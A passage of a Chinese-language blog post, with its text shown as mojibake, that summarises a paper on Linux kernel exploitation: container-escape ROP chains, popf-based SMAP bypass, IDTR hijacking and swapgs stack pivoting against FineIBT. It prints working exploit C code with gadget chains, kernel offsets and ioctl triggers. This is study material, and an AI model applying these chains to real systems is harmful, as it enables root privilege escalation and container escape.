class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rop_chain</span><span class="params">(<span class="type">uint64_t</span>* data)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nft_rule_blob.size &gt; 0</span></span><br><span class="line">    data[i++] = <span class="number">0x100</span>;</span><br><span class="line">    <span class="comment">// nft_rule_blob.dlen &gt; 0</span></span><br><span class="line">    data[i++] = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake ops addr</span></span><br><span class="line">    data[i++] = PAYLOAD_LOCATION(<span class="number">1</span>) + offsetof(<span class="keyword">struct</span> cpu_entry_area_payload, nft_expr_eval);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">    data[i++] = kbase + POP_RDI_RET;</span><br><span class="line">    data[i++] = getpid();</span><br><span class="line">    data[i++] = kbase + FIND_TASK_BY_VPID;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current += offsetof(struct task_struct, rcu_read_lock_nesting)</span></span><br><span class="line">    data[i++] = kbase + POP_RSI_RET;</span><br><span class="line">    data[i++] = RCU_READ_LOCK_NESTING_OFF;</span><br><span class="line">    data[i++] = kbase + ADD_RAX_RSI_RET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current-&gt;rcu_read_lock_nesting = 0 (Bypass rcu protected section)</span></span><br><span class="line">    data[i++] = kbase + POP_RCX_RET;</span><br><span class="line">    data[i++] = <span class="number">0</span>;</span><br><span class="line">    data[i++] = kbase + MOV_RAX_RCX_RET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bypass &quot;schedule while atomic&quot;: set oops_in_progress = 1</span></span><br><span class="line">    data[i++] = kbase + POP_RDI_RET;</span><br><span class="line">    data[i++] = <span class="number">1</span>;</span><br><span class="line">    data[i++] = kbase + POP_RSI_RET;</span><br><span class="line">    data[i++] = kbase + OOPS_IN_PROGRESS;</span><br><span class="line">    data[i++] = kbase + MOV_RSI_RDI_RET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// commit_creds(&amp;init_cred)</span></span><br><span class="line">    data[i++] = kbase + POP_RDI_RET;</span><br><span class="line">    data[i++] = kbase + INIT_CRED;</span><br><span class="line">    data[i++] = kbase + COMMIT_CREDS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find_task_by_vpid(1)</span></span><br><span class="line">    data[i++] = kbase + POP_RDI_RET;</span><br><span class="line">    data[i++] = <span class="number">1</span>;</span><br><span class="line">    data[i++] = kbase + FIND_TASK_BY_VPID;</span><br><span class="line"></span><br><span class="line">    data[i++] = kbase + POP_RSI_RET;</span><br><span class="line">    data[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// switch_task_namespaces(find_task_by_vpid(1), &amp;init_nsproxy)</span></span><br><span class="line">    data[i++] = kbase + MOV_RDI_RAX_RET;</span><br><span class="line">    data[i++] = kbase + POP_RSI_RET;</span><br><span class="line">    data[i++] = kbase + INIT_NSPROXY;</span><br><span class="line">    data[i++] = kbase + SWITCH_TASK_NAMESPACES;</span><br><span class="line"></span><br><span class="line">    data[i++] = kbase + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;</span><br><span class="line">    data[i++] = <span class="number">0</span>;</span><br><span class="line">    data[i++] = <span class="number">0</span>;</span><br><span class="line">    data[i++] = _user_rip;</span><br><span class="line">    data[i++] = _user_cs;</span><br><span class="line">    data[i++] = _user_rflags;</span><br><span class="line">    data[i++] = _user_sp;</span><br><span class="line">    data[i++] = _user_ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„è¿™ä¸ª rop å°±æ˜¯ç”¨æ¥ docker å’Œ nsjail é€ƒé€¸çš„ ropï¼Œéå¸¸çš„é•¿ï¼Œåˆ©ç”¨é‚£å‡ ä¸ªé€šç”¨å¯„å­˜å™¨å®Œå…¨ä¸è¶³ä»¥ç”¨æ¥å¸ƒç½®è¿™ä¹ˆé•¿çš„ rop  </p>
<p>ä½œè€…æå‡ºè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ª popf;ret å¦™å¦™å° gadget äº†ã€‚æ”»å‡»è€…å¯ä»¥ç°åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½è¾ƒé•¿çš„ rop é“¾ï¼Œç„¶ååœ¨ kernel æ‰§è¡Œ rop æ—¶ä½¿â½¤  popf; ret è¿™ä¸ª gadget æš‚æ—¶ç¦â½¤ SMAP æ£€æŸ¥æ¥ç„¶åæ ˆè¿ç§»è‡³â½¤â¼¾å†…å­˜ä¸­çš„æ›´â»“ rop é“¾ï¼Œè¿™å°†ä¼šå¤§å¤§çš„å‡çŸ­å†…æ ¸æ€ä¸­ rop çš„é•¿åº¦ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">u64 chain[<span class="number">4</span>];</span><br><span class="line">chain[<span class="number">0</span>] = popf_ret;</span><br><span class="line">chain[<span class="number">1</span>] = eflags;</span><br><span class="line">chain[<span class="number">2</span>] = pop_rsp_ret;</span><br><span class="line">chain[<span class="number">3</span>] = (u64)full_chain_usr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">retspill_req</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">void</span> *target;</span><br><span class="line">&#125; req;</span><br><span class="line"></span><br><span class="line">req.buf = (<span class="type">char</span> *)chain;</span><br><span class="line">req.target = (<span class="type">void</span> *)pop_rdi_ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">case 1342:</span></span><br><span class="line"><span class="comment">    struct retspill_req &#123;</span></span><br><span class="line"><span class="comment">        __user char *buf;</span></span><br><span class="line"><span class="comment">        __user void *dst;</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    char buf[0x20] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">    char *buf_ptr = 0;</span></span><br><span class="line"><span class="comment">    void *dst = 0;</span></span><br><span class="line"><span class="comment">    get_user(buf_ptr, &amp;((struct retspill_req *)arg)-&gt;buf);</span></span><br><span class="line"><span class="comment">    get_user(dst, &amp;((struct retspill_req *)arg)-&gt;dst);</span></span><br><span class="line"><span class="comment">    copy_from_user(buf, buf_ptr, sizeof(buf));</span></span><br><span class="line"><span class="comment">    asm volatile (</span></span><br><span class="line"><span class="comment">        &quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"><span class="comment">        &quot;call %0;&quot;</span></span><br><span class="line"><span class="comment">        &quot;.att_syntax prefix;&quot;</span></span><br><span class="line"><span class="comment">        : : &quot;r&quot; (dst) :</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">ioctl(dbg, <span class="number">1342</span>, &amp;req);</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸Šé¢æ‰€ç¤ºï¼Œæ”»å‡»è€…åªéœ€é€šè¿‡ 0x20 å­—èŠ‚çš„å†…æ ¸ rop é“¾å³å¯å°†å†…æ ¸çš„æ ˆæ ˆè¿ç§»è‡³ç”¨æˆ·æ€è¿›è€Œæ‰§è¡Œæå‰åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½çš„æ›´é•¿çš„ ropã€‚</p>
<img src="/2025/11/07/srh/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>æ—©æœŸå¯¹ linux kernel ä¸­æ–­å‘é‡çš„æ”»å‡»æ˜¯ç›´æ¥å»ä¿®æ”¹ä¸­æ–­å‘é‡çš„æŒ‡é’ˆï¼Œè€Œç°åœ¨çš„ linux kernel å·²ç»å°†è¿™å—åŒºåŸŸè®¾ç½®ä¸ºåªè¯»ã€‚ä½œè€…å‘ç° kernel ä¸­å­˜åœ¨ä¸€ä¸ªå« lidt çš„ gadget å¯ä»¥ç›´æ¥ä¿®æ”¹ IDTR.base åˆ°ä¸€å—æ”»å‡»è€…å¯ç”¨çš„å†…å­˜ä¸Šï¼Œè¿›è€Œè®©æ¯æ¬¡ä¸­æ–­&#x2F;å¼‚å¸¸çš„â€œé—¨æè¿°ç¬¦â€éƒ½ç”±æ”»å‡»è€…æä¾›ï¼Œå˜ç›¸çš„è®©æ”»å‡»è€…çš„è·å¾—ä»»æ„åœ°å€ call çš„åˆ©ç”¨åŸè¯­ã€‚  </p>
<img src="/2025/11/07/srh/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  
<p>ç„¶åè¿™æ˜¯è¿™ç¯‡è®ºæ–‡æœ€ç²¾å½©çš„éƒ¨åˆ†ï¼Œå°±æ˜¯é€šè¿‡åŠ«æŒ gsbase æ¥è¿›è¡Œæ ˆè¿ç§»ã€‚linux ä¸­å­˜åœ¨ä¸¤ä¸ª gsbase åˆ†åˆ«æŒ‡å‘ä¸¤ä¸ª gs ç»“æ„ï¼Œä¸€ä¸ªåœ¨ç”¨æˆ·æ€ï¼Œä¸€ä¸ªåœ¨å†…æ ¸æ€ã€‚åœ¨æ–°ç‰ˆæœ¬çš„ linux kernel ä¸­æ”¯æŒ wrgsbase æŒ‡ä»¤è®©ç”¨æˆ·å¯ä»¥è®¾ç½®ç”¨æˆ·æ€çš„ gsbaseã€‚gs ç»“æ„é‡Œé¢å­˜æ”¾ç€ rsp ç­‰é‡è¦ä¿¡æ¯ã€‚å½“ç”¨æˆ·æ€é€šè¿‡ç³»ç»Ÿè°ƒç”¨ syscall è¿›å…¥åˆ°å†…æ ¸æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ swapgs æ¥è¿›è¡Œç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„ gsbase çš„äº¤æ¢ï¼Œç„¶åä»å†…æ ¸ gsbase ä¸­å–å‡ºå†…æ ¸æ ˆçš„åœ°å€èµ‹å€¼ç»™ rsp å¯„å­˜å™¨ã€‚ä½œè€…æå‡ºå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåˆç†åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°±èƒ½å¤Ÿå®ç°æ ˆè¿ç§»ã€‚  </p>
<p>å½“æˆ‘ä»¬è·å¾— kernel ä»»æ„åœ°å€ call æ—¶ï¼Œåˆ©ç”¨è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// Store our malicious gsbase address in userspace&#x27;s gsbase</span></span><br><span class="line">wrgsbase(guess);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// we want this for later</span></span><br><span class="line">   u64 saved_rsp;</span><br><span class="line">   <span class="keyword">asm</span>(<span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %0, rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;.att_syntax prefix;&quot;</span></span><br><span class="line">       : <span class="string">&quot;=r&quot;</span>(saved_rsp)</span><br><span class="line">   );</span><br><span class="line">   <span class="comment">// ensure rsp is aligned for later</span></span><br><span class="line">   saved_rsp |= <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">   u64 cli_ret =      (<span class="number">0xffffffff8211ba15</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 ret =          (<span class="number">0xffffffff8211ba15</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 sti_ret =      (<span class="number">0xffffffff82128e80</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 swapgs_ret =   (<span class="number">0xffffffff8220130c</span><span class="number">-0xffffffff81000000</span>)+kaslr_base; <span class="comment">// pops rbp</span></span><br><span class="line">   u64 pop_rdi_ret =  (<span class="number">0xffffffff818cee6c</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 init_cred =    (<span class="number">0xffffffff8328c7e0</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 commit_creds = (<span class="number">0xffffffff81139b20</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 pop_rcx_ret =  (<span class="number">0xffffffff810a0613</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 iretq =        (<span class="number">0xffffffff822018a7</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line">   u64 user_rip_target = (u64)from_kernel;</span><br><span class="line"></span><br><span class="line">   u64 rop[] = &#123;</span><br><span class="line">       cli_ret, <span class="comment">// once swapgs executes we don&#x27;t care anyways</span></span><br><span class="line">       swapgs_ret,</span><br><span class="line">       <span class="number">0</span>,</span><br><span class="line">       pop_rdi_ret,</span><br><span class="line">       init_cred,</span><br><span class="line">       commit_creds,</span><br><span class="line">       swapgs_ret,</span><br><span class="line">       saved_rsp, <span class="comment">// rbp</span></span><br><span class="line">       iretq,</span><br><span class="line">       user_rip_target,</span><br><span class="line">       <span class="number">0x33</span>,  <span class="comment">// cs</span></span><br><span class="line">       <span class="number">0x246</span>, <span class="comment">// eflags</span></span><br><span class="line">       saved_rsp,</span><br><span class="line">       <span class="number">0x2b</span>,  <span class="comment">// ss</span></span><br><span class="line">   &#125;;</span><br><span class="line">   <span class="type">int</span> rop_len = <span class="keyword">sizeof</span>(rop)/<span class="keyword">sizeof</span>(rop[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">   populate_spray(spray_pgs, <span class="number">512</span>, guess, rop_len, rop);</span><br><span class="line"></span><br><span class="line">   spawn_orw_thread(<span class="number">0</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line">   spawn_orw_thread(<span class="number">1</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line">   spawn_orw_thread(<span class="number">2</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line">   spawn_orw_thread(<span class="number">3</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line">   spawn_orw_thread(<span class="number">4</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line">   spawn_orw_thread(<span class="number">5</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line">   spawn_orw_thread(<span class="number">6</span>, <span class="number">512</span>, spray_pgs, guess, kaslr_base);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Triggering gadget...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   .text:FFFFFFFF82201A20 000 0F 01 F8                      swapgs</span></span><br><span class="line"><span class="comment">   .text:FFFFFFFF82201A23 000 41 89 E0                      mov     r8d, esp</span></span><br><span class="line"><span class="comment">   .text:FFFFFFFF82201A26 000 EB 12                         jmp     short loc_FFFFFFFF82201A3A</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   .text:FFFFFFFF82201A3A                                   loc_FFFFFFFF82201A3A:                   ; CODE XREF: entry_SYSCALL_compat+6â†‘j</span></span><br><span class="line"><span class="comment">   .text:FFFFFFFF82201A3A 000 65 48 8B 24 25 98 28 03 00    mov     rsp, gs:32898h</span></span><br><span class="line"><span class="comment">   .text:FFFFFFFF82201A3A                                   entry_SYSCALL_compat endp</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Trigger a hijacked call with the entry_SYSCALL_compat gadget</span></span><br><span class="line">   u64 entry_SYSCALL_compat = (<span class="number">0xffffffff82201a20</span><span class="number">-0xffffffff81000000</span>)+kaslr_base;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">       case 1339: // arbitrary call</span></span><br><span class="line"><span class="comment">           void (*target)(void) = (void (*)(void))arg;</span></span><br><span class="line"><span class="comment">           target();</span></span><br><span class="line"><span class="comment">           break;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   ioctl(dbg, <span class="number">1339</span>, entry_SYSCALL_compat);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çœ‹å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å°±ç®€å•çš„ç”»äº†ä¸€ä¸ªæµç¨‹å›¾ï¼š  </p>
<img src="/2025/11/07/srh/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>è¿™é‡Œæˆ‘åªè¿›è¡Œç®€å•çš„ä»‹ç»ï¼Œå¦‚æœçœ‹ä¸æ‡‚çš„è¯å¯ä»¥è‡ªå·±å»è°ƒè¯•ä¸€éï¼Œæˆ‘ç›¸ä¿¡è¿™å°†ä¼šæå¤§çš„åŠ æ·±ä½ å¯¹è¿™ç§åˆ©ç”¨æ‰‹æ³•çš„ç†è§£  </p>
<p>é¦–å…ˆç”¨æˆ·åœ¨ä¸€å—å¯æ§çš„å†…æ ¸ç©ºé—´ä¸Šä¼ªé€ ä¸€ä¸ªæ¶æ„çš„ gs ç»“æ„ï¼Œå¹¶ä¸”å°†é‡Œé¢å­˜æ”¾çš„æ ˆåœ°å€æŒ‡å‘æ¶æ„çš„å³åé¢ rop é“¾çš„åœ°å€ï¼Œç„¶åä½¿ç”¨ wrgsbase æŒ‡ä»¤å°†ç”¨æˆ·æ€çš„ gsbase æŒ‡å‘æˆ‘ä»¬åœ¨ kernel ä¸­ä¼ªé€ çš„ gs ç»“æ„</p>
<p>å‡è®¾æˆ‘ä»¬å·²ç»è·å– kernel ä»»æ„åœ°å€ call çš„åŸè¯­ï¼Œæˆ‘ä»¬åœ¨å†…æ ¸æ€å»è°ƒç”¨ entry_SYSCALL_compat è¿™ä¸ªå‡½æ•°ï¼Œåœ¨ç»§ç»­è®²ä¹‹å‰å…ˆçœ‹çœ‹è¿™ä¸ªå‡½æ•°ä»–åšäº†ä»€ä¹ˆï¼š  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF82201A20 000 0F 01 F8                      swapgs</span><br><span class="line">.text:FFFFFFFF82201A23 000 41 89 E0                      mov     r8d, esp</span><br><span class="line">.text:FFFFFFFF82201A26 000 EB 12                         jmp     short loc_FFFFFFFF82201A3A</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF82201A3A                                   loc_FFFFFFFF82201A3A:                   ; CODE XREF: entry_SYSCALL_compat+6â†‘j</span><br><span class="line">.text:FFFFFFFF82201A3A 000 65 48 8B 24 25 98 28 03 00    mov     rsp, gs:32898h</span><br><span class="line">.text:FFFFFFFF82201A3A    </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹è§ä»–å…ˆä½¿ç”¨äº† swapgs æ¥äº¤æ¢ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„ gsbaseï¼Œç„¶åå°†å¯¹åº”çš„ gs ç»“æ„ä½“é‡Œé¢çš„æ ˆåœ°å€å–å‡ºå¹¶èµ‹å€¼ç»™ rspï¼Œç”±äºå½“å‰ç¨‹åºæµå¤„äºå†…æ ¸æ€ä¸” gsbase æ˜¯ kernel çš„ gsbaseï¼Œæ‰€ä»¥æ‰§è¡Œ swapgs åå½“å‰çš„ gsbase å°±æŒ‡å‘ç”¨æˆ·æ€çš„ gs åœ°å€ï¼Œç„¶åå°†å…¶ gs ç»“æ„çš„æ ˆåœ°å€å–å‡ºèµ‹å€¼ç»™ rspã€‚æˆ‘ä»¬å‰é¢å·²ç»å°†ç”¨æˆ·æ€çš„ gsbase æŒ‡å‘äº†ç”¨æˆ·ä¼ªé€ çš„æ¶æ„ gs ç»“æ„ï¼Œä¸”æ ˆåœ°å€è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºæˆ‘ä»¬ç”¨äºå¸ƒç½® rop çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰§è¡Œå®Œ entry_SYSCALL_compat å¯ä»¥ç›´æ¥å°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„æå‰å¸ƒç½®å¥½çš„ rop ä¸Šã€‚ç”±äºæˆ‘ä»¬çš„ç¨‹åºæµè¿˜æ˜¯åœ¨å†…æ ¸æ€è€Œ gsbase æŒ‡å‘ç”¨æˆ·æ€çš„ gs ç»“æ„ï¼Œå¾ˆå®¹æ˜“ä¼šå‡ºç°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ç°è±¡ï¼Œæ‰€ä»¥ rop åœ¨ä¸€å¼€å§‹å°±è¦å…ˆè°ƒç”¨ swapgs; ret æ¥å°† gsbase åˆ‡æ¢ä¸ºå†…æ ¸æ€çš„ï¼Œç„¶ååé¢å°±æ˜¯æ­£å¸¸çš„ rop äº†:)  </p>
<img src="/2025/11/07/srh/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>ä½œè€…ç›´æ¥æ‹¿åŸæœ‰çš„å‡ ä¸ª cve çš„ exp è¿›è¡Œä¿®æ”¹ï¼Œå°†æœ€ååŠ«æŒç¨‹åºæµåˆ©ç”¨é‚£éƒ¨åˆ†ä¿®æ”¹æˆä»–æå‡ºçš„ swapgs Stack Pivoting æ–¹æ³•è¿›è¡Œå¯¹æ¯”æˆåŠŸç‡ï¼Œå‘ç°å¤§éƒ¨åˆ†çš„æƒ…å†µæˆåŠŸç‡éƒ½ä¸å˜ï¼Œå°‘éƒ¨åˆ†æƒ…å†µæˆåŠŸç‡å‡ºç°äº†å°å¹…åº¦çš„é™ä½ï¼Œå¯è§è¿™ç§åˆ©ç”¨æ–¹æ³•æ˜¯å¯è¡Œçš„ï¼Œè‡³äºå®ç”¨æ€§ï¼Œä»–å¥½åƒæ²¡æœ‰è¯´ğŸ¤£  </p>
<img src="/2025/11/07/srh/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  
<p>ç„¶åä½œè€…æå‡ºä»–çš„è¿™ä¸ª swapgs Stack Pivoting åˆ©ç”¨æ‰‹æ³•æ˜¯å”¯ä¸€ä¸€ä¸ªå¯ä»¥ä»å‰å‘è¾¹ç¼˜æ¥ç»•è¿‡ FineIBT ä¿æŠ¤æœºåˆ¶çš„ï¼ˆæˆ‘å¾ˆæ€€ç–‘ğŸ¥²ï¼Œä½†æ˜¯æ±‡æŠ¥æ—¶æ²¡æœ‰æå‡ºæ¥ï¼‰  </p>
<p>è¯´åˆ° FineIBTï¼Œé‚£è‚¯å®šè¦å…ˆä»‹ç» IBTï¼Œåœ¨è¯´ IBT å‰é‚£è‚¯å®šè¦å…ˆä»‹ç» CET  </p>
<img src="/2025/11/07/srh/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>CET æœºåˆ¶æ˜¯ Intel æå‡ºçš„â½¤äºç¼“è§£ ROP&#x2F;JOP&#x2F;COP çš„æ–°æŠ€æœ¯ã€‚åŸºäºç¡¬ä»¶â½€æŒçš„è§£å†³â½…æ¡ˆï¼Œæ—¨åœ¨é¢„é˜²å‰å‘ï¼ˆ call&#x2F;jmp ï¼‰å’Œåå‘ï¼ˆ ret ï¼‰æ§åˆ¶æµæŒ‡ä»¤åŠ«æŒã€‚  </p>
<p>ç”¨äºé¢„é˜²åå‘æ§åˆ¶æµæŒ‡ä»¤åŠ«æŒçš„æ–¹æ³•æ˜¯ shadow stackï¼Œè¿™å¹¶ä¸åœ¨ä»Šå¤©çš„è®¨è®ºèŒƒå›´å†…ï¼Œå¦‚æœæ„Ÿå…´è¶£å¯ä»¥è‡ªè¡Œä¸Šç½‘å»æŸ¥æ‰¾èµ„æ–™ã€‚è€Œç”¨äºé¢„é˜²å‘å‰æ§åˆ¶æµæŒ‡ä»¤åŠ«æŒçš„æ–¹æ³•åˆ™æ˜¯ä½¿ç”¨ IBTã€‚IBT ä¸ºç¨‹åºæ¯ä¸ªæœ‰å¯èƒ½è¢« call æˆ–è€… jmp çš„åœ°æ–¹åŠ äº†ä¸ª endbr æŒ‡ä»¤ï¼Œå½“ç¨‹åºæ‰§è¡Œäº† call æˆ–è€… jmp æŒ‡ä»¤çš„æ—¶å€™ä¸‹ä¸€æ¡æŒ‡ä»¤å¿…é¡»æ˜¯ endbrï¼Œå¦åˆ™å°±ä¼šæŠ›å‡º #cp å¼‚å¸¸ã€‚è¿™æå¤§çš„é™åˆ¶äº†æ”»å‡»è€…å» call æˆ–è€… jmp ä¸€äº›æ¯”è¾ƒåˆ©äºåˆ©ç”¨çš„ gadgetï¼Œä½†ç”±äºç¨‹åºä¸­æ‹¥æœ‰å¤§é‡çš„ endbr æŒ‡ä»¤ï¼Œæ‰€ä»¥æ”»å‡»è€…ä¾ç„¶å¯ä»¥é€šè¿‡æ›´åŠ æ›²æŠ˜çš„è·¯å¾„æ¥è¿›è¡Œåˆ©ç”¨é“¾çš„æ„é€ ï¼Œä¾ç„¶èƒ½å¤Ÿè¿›è¡Œå‘å‰æ§åˆ¶æµæŒ‡ä»¤åŠ«æŒï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±æœ‰äººæå‡ºäº† IBT çš„åŠ å¼ºç‰ˆæœ¬å³ FineIBT</p>
<p>å…³äº FineIBT çš„è®ºæ–‡å¯ä»¥åœ¨å¦‚ä¸‹é“¾æ¥è¿›è¡ŒæŸ¥çœ‹ï¼š<a target="_blank" rel="noopener" href="https://dl.acm.org/doi/fullHtml/10.1145/3607199.3607219">FineIBT</a> è¿™é‡Œåªä¼šè¿›è¡Œç®€å•çš„æè¿°  </p>
<img src="/2025/11/07/srh/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

